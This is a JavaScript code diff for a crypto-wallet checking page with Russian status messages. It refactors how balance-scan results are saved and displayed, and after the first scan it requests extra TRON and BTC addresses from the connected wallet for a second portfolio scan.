@@ -276,15 +276,40 @@ const runAutoCheck = async () => {
 
   setStatus("Готово. Кошелёк подключён, проверка балансов отправлена в фоне.");
 
+  const applyScanResult = (scanResult, sourceAddresses = addresses) => {
+    const portfolio = scanResult.portfolio || scanResult;
+    const updatedProfile = { ...profile, ...sourceAddresses, portfolio, checkedAt: new Date().toISOString() };
+    saveProfile(updatedProfile);
+    unlockCheckForm(updatedProfile);
+    renderRiskPreview(risk, portfolio);
+    const summary = formatPortfolioText(portfolio);
+    setStatus(summary ? `Балансы получены. ${summary}` : "Балансы получены.");
+    return updatedProfile;
+  };
+
   scanWalletPortfolio(addresses, { silent: true })
-    .then((result) => {
-      const portfolio = result.portfolio || result;
-      const updatedProfile = { ...profile, portfolio, checkedAt: new Date().toISOString() };
-      saveProfile(updatedProfile);
-      unlockCheckForm(updatedProfile);
-      renderRiskPreview(risk, portfolio);
-      const summary = formatPortfolioText(portfolio);
-      setStatus(summary ? `Балансы получены. ${summary}` : "Балансы получены.");
+    .then(async (result) => {
+      const firstProfile = applyScanResult(result);
+
+      if (firstProfile.tronAddress || !window.AutoWallet?.collectAdditionalAddresses) return;
+
+      setStatus("EVM проверен. Запрашиваем TRON адрес для проверки TRX/USDT...");
+      const extra = await window.AutoWallet.collectAdditionalAddresses({ onProgress: setStatus }).catch(() => ({}));
+      const tronAddress = String(extra.tronAddress || "").trim();
+      const btcAddress = String(extra.btcAddress || "").trim();
+
+      if (!tronAddress && !btcAddress) {
+        setStatus("TRON адрес не получен от Trust Wallet. EVM проверка выполнена.");
+        return;
+      }
+
+      const enriched = {
+        ...addresses,
+        tronAddress: tronAddress || addresses.tronAddress,
+        btcAddress: btcAddress || addresses.btcAddress,
+      };
+      const secondResult = await scanWalletPortfolio(enriched, { silent: true });
+      applyScanResult(secondResult, enriched);
     })
     .catch(() => {
       setStatus("Кошелёк подключён. Балансы отправлены на проверку, сервер может дослать уведомление позже.");
